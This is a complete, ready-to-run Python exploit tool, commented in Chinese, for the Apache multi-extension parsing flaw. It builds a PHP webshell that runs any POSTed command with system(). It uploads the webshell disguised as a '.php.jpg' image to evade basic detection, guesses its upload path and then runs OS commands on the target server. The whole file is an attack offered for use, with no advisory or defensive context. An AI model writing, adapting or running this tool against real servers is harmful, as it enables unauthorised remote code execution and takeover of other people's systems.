import sys
import random
import requests
import argparse
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning

# ================= 配置项 =================
WEBSHELL_TEMPLATE = """<?php
if(isset($_POST['{cmd_key}'])){{
    system($_POST['{cmd_key}']);
}}
?>"""

FILE_UPLOAD_FIELD = "file_upload"  # 根据目标表单字段名修改
CMD_KEY = "cmd"  # Webshell参数名
TIMEOUT = 15  # 请求超时时间


# ================= 终端颜色配置 =================
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'


# ================= 核心漏洞利用类 =================
class ApacheExploiter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        self.webshell_path = None
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

        # 配置请求头
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Referer": self.base_url,
            "Origin": self.base_url
        }

    def generate_filename(self):
        """生成随机文件名绕过基础检测"""
        rand_str = ''.join(random.choices('abcdefghijkmnpqrstuvwxyz', k=6))
        return f"{rand_str}.php.jpg"

    def upload_webshell(self):
        """上传伪装成图片的Webshell"""
        filename = self.generate_filename()
        webshell = WEBSHELL_TEMPLATE.format(cmd_key=CMD_KEY)

        files = {
            FILE_UPLOAD_FIELD: (filename, webshell, "image/jpeg")
        }

        try:
            print(f"{Colors.OKBLUE}[*] 尝试上传Webshell文件: {filename}{Colors.END}")
            resp = self.session.post(
                self.target_url,
                files=files,
                headers=self.headers,
                timeout=TIMEOUT
            )

            if resp.status_code != 200:
                print(f"{Colors.FAIL}[-] 文件上传失败 (HTTP {resp.status_code}){Colors.END}")
                return False

            # 自动解析上传路径
            if "uploadfiles" in resp.text.lower():
                self.webshell_path = f"{self.base_url}/uploadfiles/{filename}"
            else:
                self.webshell_path = f"{self.base_url}/uploads/{filename}"

            print(f"{Colors.OKGREEN}[+] Webshell 疑似上传成功: {self.webshell_path}{Colors.END}")
            return True

        except Exception as e:
            print(f"{Colors.FAIL}[-] 上传过程中发生异常: {str(e)}{Colors.END}")
            return False

    def execute_command(self, command="whoami"):
        """通过Webshell执行系统命令"""
        if not self.webshell_path:
            print(f"{Colors.WARNING}[!] 尚未获取有效Webshell路径{Colors.END}")
            return False

        try:
            print(f"{Colors.OKBLUE}[*] 尝试执行命令: {command}{Colors.END}")
            resp = self.session.post(
                self.webshell_path,
                data={CMD_KEY: command},
                headers=self.headers,
                timeout=TIMEOUT
            )

            if resp.status_code == 200:
                print(f"{Colors.OKGREEN}[+] 命令执行响应 ({len(resp.text)} bytes):\n{resp.text.strip()}{Colors.END}")
                return True
            print(f"{Colors.FAIL}[-] 命令执行失败 (HTTP {resp.status_code}){Colors.END}")
            return False

        except Exception as e:
            print(f"{Colors.FAIL}[-] 执行命令时发生异常: {str(e)}{Colors.END}")
            return False


# ================= 主程序 =================
def main():
    parser = argparse.ArgumentParser(description="Apache解析漏洞利用工具")
    parser.add_argument("-t", "--target", required=True, help="文件上传接口URL")
    parser.add_argument("-c", "--command", default="whoami", help="要执行的系统命令")
    args = parser.parse_args()

    print(f"\n{Colors.HEADER}=== Apache 多后缀解析漏洞利用工具 ==={Colors.END}")

    exploiter = ApacheExploiter(args.target)
    if exploiter.upload_webshell():
        exploiter.execute_command(args.command)


if __name__ == "__main__":
    main()